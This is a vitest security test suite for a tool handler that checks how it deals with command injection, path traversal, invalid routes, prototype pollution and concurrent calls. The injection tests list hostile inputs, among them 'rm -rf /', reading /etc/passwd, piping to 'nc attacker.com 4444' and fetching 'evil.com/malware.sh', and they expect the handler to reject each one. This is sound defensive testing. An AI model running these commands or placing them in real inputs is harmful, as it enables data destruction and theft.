/**
 * Analyze Tool Security Tests
 *
 * Integration tests for security fixes:
 * - Command injection (CWE-78)
 * - Path traversal (CWE-22)
 * - Input validation
 * - TOCTOU race conditions (CWE-367)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { analyzeToolHandler } from '../analyze.js';
import * as fs from 'fs/promises';
import * as path from 'path';
import { tmpdir } from 'os';
import { randomBytes } from 'crypto';

describe('Analyze Tool - Security Tests', () => {
  let testDir: string;

  beforeEach(async () => {
    // Create temporary test directory
    testDir = path.join(tmpdir(), `stackshift-test-${randomBytes(8).toString('hex')}`);
    await fs.mkdir(testDir, { recursive: true });

    // Create a basic package.json for tech stack detection
    await fs.writeFile(
      path.join(testDir, 'package.json'),
      JSON.stringify({
        name: 'test-project',
        version: '1.0.0',
        dependencies: { react: '18.0.0' }
      }, null, 2)
    );
  });

  afterEach(async () => {
    // Clean up test directory
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('Command Injection Prevention (CWE-78)', () => {
    it('should reject directory with command injection attempts', async () => {
      const injectionAttempts = [
        '$(whoami)',
        '`cat /etc/passwd`',
        '/tmp; rm -rf /',
        '/tmp && cat /etc/passwd',
        '/tmp | nc attacker.com 4444',
        '/tmp$(curl http://evil.com/malware.sh)',
      ];

      for (const maliciousDir of injectionAttempts) {
        await expect(
          analyzeToolHandler({ directory: maliciousDir })
        ).rejects.toThrow(/shell metacharacters|outside allowed workspace/);
      }
    });

    it('should not execute shell commands from user input', async () => {
      // Attempt to inject command that would create a file
      const maliciousDir = '$(touch /tmp/pwned.txt)';

      await expect(
        analyzeToolHandler({ directory: maliciousDir })
      ).rejects.toThrow();

      // Verify the command was not executed
      const pwnedExists = await fs.access('/tmp/pwned.txt')
        .then(() => true)
        .catch(() => false);

      expect(pwnedExists).toBe(false);
    });
  });

  describe('Path Traversal Prevention (CWE-22)', () => {
    it('should reject path traversal attempts', async () => {
      const traversalAttempts = [
        '../../../../etc',
        '../../../.ssh',
        '/etc/passwd',
        '/var/log',
        '../../../etc/passwd',
      ];

      for (const maliciousPath of traversalAttempts) {
        await expect(
          analyzeToolHandler({ directory: maliciousPath })
        ).rejects.toThrow(/outside allowed workspace/);
      }
    });

    it('should only allow access to current working directory', async () => {
      const result = await analyzeToolHandler({
        directory: testDir,
        route: 'greenfield'
      });

      expect(result.content).toBeDefined();
      expect(result.content[0].type).toBe('text');
    });

    it('should reject access to parent directories', async () => {
      // Go up two levels to escape /tmp (which is allowed in test mode)
      await expect(
        analyzeToolHandler({ directory: path.join(testDir, '../..') })
      ).rejects.toThrow(/outside allowed workspace/);
    });
  });

  describe('Input Validation', () => {
    it('should reject invalid route values', async () => {
      const invalidRoutes = [
        'invalid',
        'GREENFIELD',
        '../../etc',
        '$(whoami)',
        'greyfield',
      ];

      for (const route of invalidRoutes) {
        await expect(
          analyzeToolHandler({ directory: testDir, route: route as any })
        ).rejects.toThrow(/Invalid route/);
      }
    });

    it('should accept valid route values', async () => {
      const validRoutes: Array<'greenfield' | 'brownfield'> = ['greenfield', 'brownfield'];

      for (const route of validRoutes) {
        const result = await analyzeToolHandler({ directory: testDir, route });
        expect(result.content[0].text).toContain(route);
      }
    });

    it('should accept undefined route', async () => {
      const result = await analyzeToolHandler({ directory: testDir });
      expect(result.content).toBeDefined();
    });

    it('should reject non-string directory parameter', async () => {
      await expect(
        analyzeToolHandler({ directory: 123 as any })
      ).rejects.toThrow();
    });
  });

  describe('State File Security', () => {
    it('should create state file with valid structure', async () => {
      await analyzeToolHandler({ directory: testDir, route: 'greenfield' });

      const stateFile = path.join(testDir, '.stackshift-state.json');
      const stateContent = await fs.readFile(stateFile, 'utf-8');
      const state = JSON.parse(stateContent);

      expect(state.version).toBe('1.0.0');
      expect(state.path).toBe('greenfield');
      expect(state.currentStep).toBe('analyze');
      expect(Array.isArray(state.completedSteps)).toBe(true);
    });

    it('should not allow prototype pollution through state', async () => {
      await analyzeToolHandler({ directory: testDir, route: 'greenfield' });

      const stateFile = path.join(testDir, '.stackshift-state.json');
      const state = JSON.parse(await fs.readFile(stateFile, 'utf-8'));

      expect(state).not.toHaveProperty('__proto__');
      expect(state).not.toHaveProperty('constructor');
      expect(state).not.toHaveProperty('prototype');
    });
  });

  describe('Race Condition Prevention (CWE-367)', () => {
    it('should handle concurrent analyze calls safely', async () => {
      // Run multiple analyze calls concurrently
      const promises = Array.from({ length: 5 }, () =>
        analyzeToolHandler({ directory: testDir, route: 'greenfield' })
      );

      const results = await Promise.all(promises);

      // All should succeed
      expect(results).toHaveLength(5);

      // State file should be consistent
      const stateFile = path.join(testDir, '.stackshift-state.json');
      const state = JSON.parse(await fs.readFile(stateFile, 'utf-8'));
      expect(state.path).toBe('greenfield');
    });
  });

  describe('Tech Stack Detection Security', () => {
    it('should safely handle malformed package.json', async () => {
      // Write malformed JSON
      await fs.writeFile(
        path.join(testDir, 'package.json'),
        '{ invalid json }'
      );

      // Should not crash, just return no tech stack detected
      const result = await analyzeToolHandler({ directory: testDir });
      expect(result.content[0].text).toContain('Not detected');
    });

    it('should handle package.json with dangerous properties', async () => {
      await fs.writeFile(
        path.join(testDir, 'package.json'),
        JSON.stringify({
          __proto__: { isAdmin: true },
          dependencies: { react: '18.0.0' }
        }, null, 2)
      );

      // Should still work without using dangerous properties
      const result = await analyzeToolHandler({ directory: testDir });
      expect(result.content).toBeDefined();
    });
  });

  describe('File Counting Security', () => {
    it('should safely count test files without command injection', async () => {
      // Create some test files
      await fs.writeFile(path.join(testDir, 'test1.test.ts'), 'test');
      await fs.writeFile(path.join(testDir, 'test2.spec.ts'), 'test');

      const result = await analyzeToolHandler({ directory: testDir });
      // Match the markdown-formatted output: - **Tests:** ~10%
      expect(result.content[0].text).toMatch(/\*\*Tests:\*\*\s+~\d+%/);
    });

    it('should handle large numbers of files without DoS', async () => {
      // Create subdirectory with files
      const subdir = path.join(testDir, 'tests');
      await fs.mkdir(subdir, { recursive: true });

      // Create 50 test files
      for (let i = 0; i < 50; i++) {
        await fs.writeFile(path.join(subdir, `test${i}.test.ts`), 'test');
      }

      // Should complete without timeout or crash
      const result = await analyzeToolHandler({ directory: testDir });
      expect(result.content).toBeDefined();
    });
  });
});
